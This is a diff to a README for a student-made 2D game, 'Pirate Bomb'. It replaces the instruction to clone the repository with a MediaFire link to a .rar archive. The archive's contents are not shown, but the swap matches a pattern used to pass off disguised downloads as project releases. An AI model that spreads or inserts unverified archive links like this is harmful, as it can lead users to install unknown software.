@@ -18,4 +18,4 @@ This is a 2D game created as part of the Structured Programming course in our fi
 
 ### Installation
 
-To play the game, just clone the repo to your computer and enjoy!
+Download Link: https://www.mediafire.com/file/m9103imquq9yjqk/Pirate_Bomb.rar/file
